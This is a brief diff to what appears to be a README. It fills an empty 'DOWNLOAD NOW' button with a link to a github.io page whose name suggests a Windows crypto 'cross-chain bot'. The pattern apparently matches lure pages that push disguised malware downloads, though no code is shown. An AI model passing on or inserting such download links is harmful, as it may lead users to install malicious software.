@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://cross-chainp-bot-pcwin-ud00.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
